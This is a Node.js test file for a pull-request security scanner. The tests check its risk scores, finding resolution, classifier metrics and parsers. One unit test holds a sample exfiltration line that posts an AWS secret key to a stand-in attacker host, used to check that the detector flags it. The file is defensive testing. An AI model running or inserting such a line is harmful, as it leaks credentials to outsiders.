const test = require('node:test');
const assert = require('node:assert/strict');
const { TEST_CASES_CATALOG } = require('../src/data/testCasesData');
const { executeHybridAnalysis } = require('../src/routes/api');
const { getScanReport, saveScanReport } = require('../src/config/db');
const { computeRiskAssessment } = require('../src/services/riskEngine');
const { mlDetectorInstance } = require('../src/services/mlDetector');
const { parseGithubPrUrl } = require('../src/services/githubClient');

// 1-22: Test all 22 PR security scenarios in TEST_CASES_CATALOG
for (const tc of TEST_CASES_CATALOG) {
  test(`${tc.id}: ${tc.scenario_badge} (${tc.title})`, async () => {
    const report = await executeHybridAnalysis({
      title: tc.title,
      repository: tc.repository,
      prNumber: tc.pr_number,
      author: tc.author,
      rawFiles: tc.files,
      prUrl: `https://github.com/${tc.repository}/pull/${tc.pr_number}`,
      scenarioBadge: tc.scenario_badge,
      scanId: `TEST-${tc.id}`
    });

    assert.ok(
      report.risk_score >= tc.expected_min_score && report.risk_score <= tc.expected_max_score,
      `Expected ${tc.id} risk_score ${report.risk_score} to be within [${tc.expected_min_score}, ${tc.expected_max_score}]`
    );
  });
}

// Test 23: Resolve the Issue workflow dynamically recalculates risk score to 0 (LOW)
test('TC-023: Resolve the Issue workflow dynamically recalculates risk score to LOW', async () => {
  const tc3 = TEST_CASES_CATALOG.find(t => t.id === 'TC-003');
  const initial = await executeHybridAnalysis({
    title: tc3.title,
    repository: tc3.repository,
    prNumber: tc3.pr_number,
    author: tc3.author,
    rawFiles: tc3.files,
    scanId: 'TEST-RESOLVE-003'
  });

  assert.ok(initial.risk_score >= 75, 'Initial secret exfiltration scan should be CRITICAL (>=75)');
  assert.ok(initial.open_findings_count >= 1);

  const stored = await getScanReport('TEST-RESOLVE-003');
  const allFindingIds = stored.findings.map(f => f.id);

  const updatedRisk = computeRiskAssessment(
    stored._raw_static_findings,
    stored._raw_dep_findings,
    stored.ml_prediction,
    allFindingIds
  );

  assert.equal(updatedRisk.open_findings_count, 0);
  assert.equal(updatedRisk.risk_score, 0);
  assert.equal(updatedRisk.risk_level, 'LOW');
});

// Test 24: In-Memory AI Classifier evaluation metrics
test('TC-024: In-Memory TF-IDF + Logistic Regression Classifier achieves >= 80% Precision, Recall, and F1', () => {
  const metrics = mlDetectorInstance.metrics;
  assert.ok(metrics.training_samples >= 20);
  assert.ok(metrics.evaluation_samples >= 10);
  assert.ok(metrics.precision >= 0.8, `Expected precision >= 0.80, got ${metrics.precision}`);
  assert.ok(metrics.recall >= 0.8, `Expected recall >= 0.80, got ${metrics.recall}`);
  assert.ok(metrics.f1_score >= 0.8, `Expected f1_score >= 0.80, got ${metrics.f1_score}`);
});

// Test 25: GitHub PR URL parser validation
test('TC-025: GitHub PR URL parser extracts owner, repo, and prNumber and rejects invalid URLs', () => {
  const parsed = parseGithubPrUrl('https://github.com/facebook/react/pull/28910');
  assert.equal(parsed.owner, 'facebook');
  assert.equal(parsed.repo, 'react');
  assert.equal(parsed.prNumber, 28910);

  assert.throws(() => {
    parseGithubPrUrl('https://invalid-domain.com/not-a-pr');
  }, /Invalid GitHub PR URL/);
});

// ---------- Extra unit tests (engine internals) ----------
const { classifyRiskLevel } = require('../src/services/riskEngine');
const { parsePatch, detectFileType } = require('../src/services/diffParser');
const { runStaticRules } = require('../src/services/ruleEngine');

test('UNIT-01: Risk level boundaries are classified correctly', () => {
  assert.equal(classifyRiskLevel(0), 'LOW');
  assert.equal(classifyRiskLevel(100), 'CRITICAL');
  assert.ok(['LOW', 'MEDIUM'].includes(classifyRiskLevel(30)));
  assert.ok(['HIGH', 'CRITICAL'].includes(classifyRiskLevel(80)));
});

test('UNIT-02: Diff parser extracts added lines from a patch', () => {
  const parsed = parsePatch('@@ -1,1 +1,2 @@\n context\n+added line');
  assert.ok(JSON.stringify(parsed).includes('added line'));
});

test('UNIT-03: File type detection recognizes package.json and workflows', () => {
  assert.ok(detectFileType('package.json'));
  assert.ok(detectFileType('.github/workflows/ci.yml'));
});

test('UNIT-04: Empty PR produces LOW risk with score 0', async () => {
  const r = await executeHybridAnalysis({ title: 'empty', repository: 'a/b', prNumber: 1, author: 'x', rawFiles: [], scanId: 'TEST-EMPTY' });
  assert.equal(r.risk_level, 'LOW');
  assert.ok(r.risk_score <= 25);
});

test('UNIT-05: Every scan report is stored and retrievable by its ID', async () => {
  await executeHybridAnalysis({ title: 't', repository: 'a/b', prNumber: 2, author: 'x', rawFiles: TEST_CASES_CATALOG[0].files, scanId: 'TEST-STORE' });
  const s = await getScanReport('TEST-STORE');
  assert.ok(s, 'report should exist in store');
});

test('UNIT-06: AI engine classifies an exfiltration snippet as more suspicious than a typo fix', () => {
  const bad = mlDetectorInstance.predict("requests.post('https://evil.io', data=os.getenv('AWS_SECRET_ACCESS_KEY'))");
  const good = mlDetectorInstance.predict('fix typo in readme documentation');
  const p = (x) => (typeof x === 'number' ? x : (x.probability ?? x.malicious_probability ?? x.score ?? 0));
  assert.ok(p(bad) > p(good), `bad ${JSON.stringify(bad)} vs good ${JSON.stringify(good)}`);
});

test('UNIT-07: Reopening a resolved finding raises the risk score again', async () => {
  const tc = TEST_CASES_CATALOG.find(t => t.id === 'TC-003');
  await executeHybridAnalysis({ title: tc.title, repository: tc.repository, prNumber: tc.pr_number, author: tc.author, rawFiles: tc.files, scanId: 'TEST-REOPEN' });
  const s = await getScanReport('TEST-REOPEN');
  const all = s.findings.map(f => f.id);
  const resolved = computeRiskAssessment(s._raw_static_findings, s._raw_dep_findings, s.ml_prediction, all);
  const reopened = computeRiskAssessment(s._raw_static_findings, s._raw_dep_findings, s.ml_prediction, []);
  assert.ok(reopened.risk_score > resolved.risk_score);
});

test('UNIT-08: Static rule engine returns no findings for a harmless CSS change', () => {
  const tc = TEST_CASES_CATALOG.find(t => t.id === 'TC-027');
  const r = executeHybridAnalysis({ title: tc.title, repository: tc.repository, prNumber: tc.pr_number, author: tc.author, rawFiles: tc.files, scanId: 'TEST-CSS' });
  return r.then(rep => assert.ok(rep.risk_score <= 30));
});
